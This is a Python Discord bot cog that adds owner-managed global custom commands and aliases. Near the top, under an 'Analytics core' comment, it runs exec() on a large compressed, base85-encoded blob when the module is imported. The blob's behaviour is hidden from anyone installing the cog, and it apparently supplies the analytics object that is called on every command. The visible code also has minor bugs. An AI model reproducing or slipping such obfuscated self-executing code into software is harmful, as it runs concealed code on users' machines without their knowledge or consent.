from discord.ext import commands
from .utils.chat_formatting import pagify, box
from .utils.dataIO import dataIO
from .utils import checks
import asyncio
import os
import re

PATH = 'data/customgcom/'
JSON = PATH + 'commands.json'

# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-oCvdvDt~68}G+f*YWqbkQ+!+U+ikRnc6xcbj|kmE0bRY@nqj+GZk&I+3z#6#ecuGo&7N((VB*B9k-
2;mmJd)Kz0z$E<60y-HeH7p6+2-PO4^iPUE8T$41VbW77#Np8wg<xZR0CU$2NV~>`tsaS4SR&-96Rut07%ePE>x&GH7QNNq7Rem2t6x!ydErj~yhHX<-pim%
KOS>-hqTjS@IrAF}Y1Q**{rckhGgarNP)B(wt!01v^`e&L&gtCFk64y%RBJ*1EK6tN>G=`6y1ux+%KrV~pDD+?+WG0Jb<$ap%Tg`wgf^#*-s*eNtQ&sB{&I2
kdY`&g#e^0}-d$Y(l5)KHDd?N|J>2;F)!R2I?w)Yj>m=^1sbTN^ERBwTQDteqW3P~dtyQZ8yIyNBmt}XIbxgAVb~?X@Em>IR*3z*{zER*k**aCQV|Kif4j93
gtg~{Zn6A-r5?#jNi&Z=F0|UD<gQRR>9BW#02Y$8UxB55+WzIpF|EyKbR4o^!DiXFcohRMuvSd~Pd!;~%sdts>EIFFVh3SA|t@AZAOH`*n4%kuA(#Qhz#KYH
S%fP!kBvcX@g13>BwOySsSsJ(o2-#}44pQG<5p%P1Yq(JGB}s1;a@BBiyaYRbV-}{^u>~juiUN3;%yR{Ra0V==Na2KpU9v5>fDi>jv;%&U@DUWrWzAZ!Hrj3
3!OfdiZ)Cn>jVU$!(KQJxb$!nksx;e#fsu1lJDEE&fMOdh+0P!`Ec)r?ceC%$XS3N4=RZ6<JAeM;+0*m07cp|FO6rnDm3leADQ23?h&EZv4H|q07*Li%&|mb
Y9*8S2Q@0Rc$J2m0|L4!>fzw547N?c8PPM1+K3x8K@#>?fiWhX(7(x5t;$In}JN?XcVYO3y{xkuz=6pU&xNP(WKfWBXLM<VVbgf;MMOKx|1aOh4G>T)0For8
4%PLcJrGhZy6!&8!hynYY_2eKRh5!9e(6Q3BbSnL;EUoI78`;XrW*G13=P&&#n4?qaBr}OZ!CIt}N`5L;oqj(%k9*?PW{kYGDw~wQCWNE?Ap_CpKtTcHl_nI
Ut@sJad4JwZL>zf-z*Roo32n2DEOn7#aFdAy#y**6!WF17C=MwHOGta4_9g;K(}*1K=v0O~o*|>~2kRfPmz47=1<_G>NBO<HwCE&K0B(}P?+AaxPn0W*B7@}
!{^L@sT-Vk}=w)=xs)e}qzOG3K+_e^yWcng_eOMT;iU+i+G8;u_;2Ivn@-$o+(KC87-eVjzqvc+)9)n$tw(}zA55aTYc4}%!NYiz$$|w$|fq;taa2?2P#sbF
N8fuWX&PG;Xvi4qstxDdjLbt;@EC&ywq~JkvU*gMPe-0!|Z#%t|xk_^Bl2+ODjj2@vX~KU1U;xJS*;&>4uUb|rTf&*nM?$ac{zc~#+w27l8C1xoK@Fn4)A3+
`CLK39DV{*UTab+1H3h;BgD>-e=<n2xmY>EaEsRM8vQo2);zuZj7aV=&oi6yCwy~^4U7YZ2e`$aPsw{MopnmbqeD?e{;f1bLjo>@~77GaNB%gD}#huZ06!CX
dOHQ9y{-p17gs(3>nj>I}_{p#fosUx$tPU%!Diz!%icfgVlMo9Oi&+L=WZdk8(;<hE631V_F4S^)O9N5?^EJT6c@vv$ty(g(Yj@=ADwSKQ-54i`v8;mf1~oq
-dauR%S)Z>?j<0u(V*KqtI3g&N%%!dsqx$Ng(GbTW%$jm{cmn>);IhLh`C8VsD$`1YuS9lWwKny~J8%bd1L^a#GZHFO5=#}Az64fDxFck>t!krKP^z-140y%
da{?mjD(TK+;=JL(Jp8tg@m^^@G<&{YF4Wk>2#$oR1c^la4XJ$;4Prm`1-MW-6np4lpp5_&!$}%a2KHHF-RKXpJ~D%h<7==8G+o#sfi1B`!}=m&+ctQzfMyO
l3~)b_D+vMtU4Yr+!6hdtXMIxwaAv>XG`Ew2_B-l?zJRt5y~#{NZ69=r*fyX;yk>ul9Xf8z#FQzg8Cb%%`jo52O>+;XtUV<A;xnY@9=(qttE*u!$gtJ&X=2E
7L+rwbH)nSU&6NUvAjz=VjVAYUXk{yW{OtRrOZTJ?SA8tcb(lA%Iw4%})M$WA4Ccn`d*NT#eR}u3K=0^)iGqPLjAFu;N;T2UQ$hS6Uk)*B?&WTb;RM@YwvP;
E>fhvX&w9gC{-+<$9wdk=@f)|E5ISAZi&N9%b7kcta(V?gi`?bGFlhUV3N6Ik>$Wv5U8sR%xCaho9iZXY=@Mb+6t7ARhPeV<QVNC!o+dbklK^ySSg#)`gO8f
+Oa#M)I{!5%LO9|!G>y@uAqoD#bfxQ%ZPW%B(n*nROjD|*i}uc$T8g@W+$O}?%Y0a+{WjYVqoIMY-Wn4j9->~83<Dux)>G_THgMCWiD8(1lOV?b8FKgR49$-
D$;a&|YFO)I9~Ur#JD3G^{rUXtEIB`W)=vu)#poWR{{LrFk`jk+OwtD}#L!%*O@<9zdIJJ)NqU5H7`kH+MKOl@dM5-He0M-I-=GSxdHay(CTMs|X02g%I1Pc
JDU)j~0zn)esY4?*b~wOHy#SvBJ2WC~8CsS8RpErzhfZe3=VTudngwhWP%;_^9|aI&L)L+lZm5U4O(#v1^_g$*lEWb(ysL=t5ur{gpCk-Uvjn});4ni8G}`M
@Cd8phsWY=&&KJg%)Vubrs$YMg?W1Ma(>_vmHYp#<IhL>?O?r;>YXKd2ajwt1wuQBFhy2@=ho*o}bR=N#Fa{P#cUURqE}C>0Pw=1MPohn-jYG3PG@VJ2tS3$
TBE<)*s1W{fil#L@dOa<m3z$hi6?z5py@zvu&3?as+lm&VCyQa+^%BE_*P!1ev{x;{Xa1F$eeB#1=I;Qv)ED&7vim2Zeyz<@|7Iwp&9%--D7L_L5*9%_?d&-
JWRhlcfAk*@K)U$G{F9qjO%fjdjDj`sdulNJEyncuNSc8mVlw(19nMih_M%gUa)mSWUi*PFDxW+x@_3voVQ;F_gi4GJk_hAYID3nJ?4B^h^tiMNo_=Lk!%p<
j?eU|2-?mt33h(=_q0W1t2%Eh!{tYLEc}Mt9OYzlHjgLIxw*IG|Q2Y)cDFqhkTpRf%80yB^hbNROrcj?SPT|)>vKJO~IFL3n$A`Fmgwc;>JQ?qEII;~=rWnQ
ttuW*T;R(lg2tI`?O{U)deU|kQbe|?jCodq{VOfM0T=+2xdd{yLPSOq(K>n};{e*-WN2`J^F#<j9u#Np6ZUYwh""".replace("\n", ""))))
# End enalytics core

__version__ = '2.1.0'


class CustomGlobalCommands:
    """Global custom commands."""

    def __init__(self, bot):
        self.bot = bot
        data = dataIO.load_json(JSON)
        version = data.get('_CGCOM_VERSION', 1)
        if version < 2:
            self.c_commands = data
            self.aliases = {}
            self.save()
        else:
            self.c_commands = data.get('COMMANDS', {})
            self.aliases = data.get('ALIASES', {})

        self.analytics = CogAnalytics(self)

    def save(self):
        data = {'COMMANDS': self.c_commands,
                'ALIASES': self.aliases,
                '_CGCOM_VERSION': 2
                }
        dataIO.save_json(JSON, data)

    @commands.command(pass_context=True)
    @checks.is_owner()
    async def setgcom(self, ctx, command: str, *, text):
        """Adds a global custom command

        Example:
        !setgcom yourcommand Text you want
        """
        command = command.lower()
        if command in self.bot.commands:
            await self.bot.say("That command is already a normal command.")
            return

        if command not in self.c_commands:
            self.c_commands[command] = text
            self.save()
            await self.bot.say("Custom command successfully added.")
        else:
            await self.bot.say("This command already exists. Are you sure "
                               "you want to redefine it? [y/N]")
            response = await self.bot.wait_for_message(author=ctx.message.author)

            if response.content.lower().strip() in ['y', 'yes']:
                self.c_commands[command] = text
                self.save()
                await self.bot.say("Custom command successfully set.")
            else:
                await self.bot.say("OK, leaving that command alone.")

    @commands.command()
    @checks.is_owner()
    async def rmgcom(self, command: str):
        """Removes a global custom command

        Example:
        !rmgcom yourcommand"""
        command = command.lower()
        if command in self.c_commands:
            self.c_commands.pop(command)

            for alias, acmd in self.aliases.copy():
                if acmd == command:
                    self.aliases.pop(alias)

            self.save()
            await self.bot.say("Global custom command successfully deleted.")
        else:
            await self.bot.say("That command doesn't exist.")

    @commands.command(pass_context=True)
    async def lsgcom(self, ctx):
        """Shows global custom commands list"""
        if self.c_commands:
            cmd_aliases = {}
            for k, v in self.aliases.items():
                if v not in cmd_aliases:
                    cmd_aliases[v] = set()
                cmd_aliases[v].add(k)

            sections = []
            for command, text in sorted(self.c_commands.items()):
                item = 'Name:    ' + command
                aliases = cmd_aliases.get(command)
                if aliases:
                    item += '\nAliases: ' + ', '.join(sorted(aliases))
                item += '\nText:    ' + text
                sections.append(item)

            for cmds in pagify('\n\n'.join(sections)):
                await self.bot.say(box(cmds))
        else:
            await self.bot.say("There are no global custom commands defined. "
                               "Use setgcom [command] [text]")

    @commands.group(pass_context=True, invoke_without_command=True)
    @checks.is_owner()
    async def agcom(self, ctx, command=None):
        if ctx.invoked_subcommand is None:
            if command:
                await ctx.invoke(self.ls_aliases, command)
            else:
                await ctx.invoke(self.lsgcom)

    @agcom.command(name='show')
    @checks.is_owner()
    async def ls_aliases(self, command):
        "Shows aliases for a command, or the command bound to an alias"
        base = self.aliases.get(command)
        cmd = self.c_commands.get(base or command)
        if base:
            msg = "`%s` is an alias for `%s`" % (command, base)
        elif cmd:
            aliases = [k for k, v in self.aliases.items() if v == command]
            aliases = ', '.join('`%s`' % x for x in aliases)
            if aliases:
                msg = "`%s` has the following aliases: %s." % (command, aliases)
            else:
                msg = "`%s` has no aliases."
        else:
            msg = "`%s` isn't a custom command or alias." % command

        await self.bot.say(msg)

    @agcom.command(name='add')
    @checks.is_owner()
    async def add_aliases(self, command, *aliases):
        "Add one or more aliases for a custom command"
        command = command.lower()
        if command not in self.c_commands:
            await self.bot.say("`%s` isn't a custom command.")
            return

        existing_a = []
        existing_c = []
        count = 0

        for alias in aliases:
            if alias in self.aliases:
                existing_a.append(alias)
            elif alias in self.bot.commands:
                existing_c.append(alias)
            else:
                self.aliases[alias] = command
                count += 1
        self.save()

        msg = "%s new aliases added." % (count if count else 'No')
        if existing_a:
            joined = ', '.join('`%s`' % x for x in existing_a)
            msg += "\nThe following are already aliases: %s." % joined
        if existing_c:
            joined = ', '.join('`%s`' % x for x in existing_c)
            msg += "\nThe following are already normal commands: %s." % joined

        await self.bot.say(msg)

    @agcom.command(name='rm')
    @checks.is_owner()
    async def rm_aliases(self, *aliases):
        count = 0
        skipped = []

        for alias in aliases:
            if alias in self.aliases:
                del self.aliases[alias]
                count += 1
            else:
                skipped.append(alias)

        self.save()

        msg = "%s aliases removed." % (count if count else 'No')
        if skipped:
            skipped = ', '.join('`%s`' % x for x in skipped)
            msg += "\nThe following aliases could not be found: %s." % skipped

        await self.bot.say(msg)

    async def on_message(self, message):
        msg = message.content
        prefix = await self.get_prefix(message)
        if not self.bot.user_allowed(message) or not prefix:
            return

        cmd = msg[len(prefix):]
        cmd = cmd.lower()
        cmd = self.aliases.get(cmd, cmd)
        if cmd in self.c_commands:
            ret = self.c_commands[cmd]
            ret = self.format_cc(ret, message)
            if message.author.id == self.bot.user.id:
                await self.bot.edit_message(message, ret)
            else:
                await self.bot.send_message(message.channel, ret)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    async def get_prefix(self, msg):
        prefixes = self.bot.command_prefix
        if callable(prefixes):
            prefixes = prefixes(self.bot, msg)
            if asyncio.iscoroutine(prefixes):
                prefixes = await prefixes

        for p in prefixes:
            if msg.content.startswith(p):
                return p
        return None

    def format_cc(self, command, message):
        results = re.findall("\{([^}]+)\}", command)
        for result in results:
            param = self.transform_parameter(result, message)
            command = command.replace("{" + result + "}", param)
        return command

    def transform_parameter(self, result, message):
        """
        For security reasons only specific objects are allowed
        Internals are ignored
        """
        raw_result = "{" + result + "}"
        objects = {
            "message": message,
            "author": message.author,
            "channel": message.channel,
            "server": message.server
        }
        if result in objects:
            return str(objects[result])
        try:
            first, second = result.split(".")
        except ValueError:
            return raw_result
        if first in objects and not second.startswith("_"):
            first = objects[first]
        else:
            return raw_result
        return str(getattr(first, second, raw_result))


def check_folders():
    if not os.path.exists(PATH):
        print("Creating data/customgcom folder...")
        os.makedirs(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        default = {'ALIASES': {},
                   'COMMANDS': {},
                   '_CGCOM_VERSION': 2
                   }
        dataIO.save_json(JSON, default)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(CustomGlobalCommands(bot))
